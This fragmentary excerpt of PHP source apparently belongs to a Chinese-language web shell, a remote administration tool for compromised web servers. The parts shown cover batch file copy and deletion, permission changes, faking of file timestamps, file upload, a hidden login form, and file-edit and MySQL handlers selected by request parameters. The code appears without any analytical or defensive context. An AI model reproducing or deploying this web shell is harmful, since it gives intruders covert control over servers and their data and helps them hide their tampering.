    ...
    while ($i < $count) {
        ...
        switch ($actall) {
            case "a" : $inver = urldecode($inver);
                ...
                $msg = '复制到' . $inver . '目录';
                break;
            case "b" : if (!@unlink($array[$i])) {
                    @chmod($filename, 0666);
                    @unlink($array[$i]);
                } $msg = '删除';
                break;
            case "c" : if (!eregi("^[0-7]{4}$", $inver))
                    return '属性值错误';
                $newmode = base_convert($inver, 8, 10);
                @chmod($array[$i], $newmode);
                $msg = '属性修改为' . $inver;
                break;
            case "d" : @touch($array[$i], strtotime($inver));
                $msg = '修改时间为' . $inver;
                break;
        }
        $i++;
...
function File_a($p) {
    ...
    if (!empty($_FILES['ufp']['name'])) {
        if ($_POST['ufn'] != '')
            ...
            $upfilename = $_FILES['ufp']['name'];$MSG_BOX = File_Up($_FILES['ufp']['tmp_name'], File_Str($REAL_DIR . '/' . $upfilename)) ? '上传文件 ' . $upfilename . ' 成功' : '上传文件 ' . $upfilename . ' 失败';
    }
...
<html>
	<body style="background:#FFF;">
		<center  id='login' style='display:none;'>
		<form method="POST">
...
switch ($s) {
    ...
    case "o" : Mysql_o();
        break;
    case "p" : File_Edit($_GET['fp'], $_GET['fn']);
        break;
    case "q" : File_Soup($p);
        break;
    case "r" : Mysql_Msg();
